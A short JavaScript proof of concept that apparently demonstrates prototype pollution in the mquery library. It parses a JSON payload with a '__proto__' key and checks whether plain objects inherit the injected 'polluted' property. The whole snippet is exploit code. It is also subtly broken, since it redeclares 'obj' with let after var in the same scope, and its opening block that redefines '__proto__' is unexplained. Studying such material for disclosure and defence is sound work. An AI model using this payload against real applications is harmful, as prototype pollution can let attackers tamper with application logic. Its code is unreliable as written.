var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const mquery = require('mquery');
let obj = {};
var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
console.log({}.polluted);
var m = mquery(payload);
console.log({}.polluted);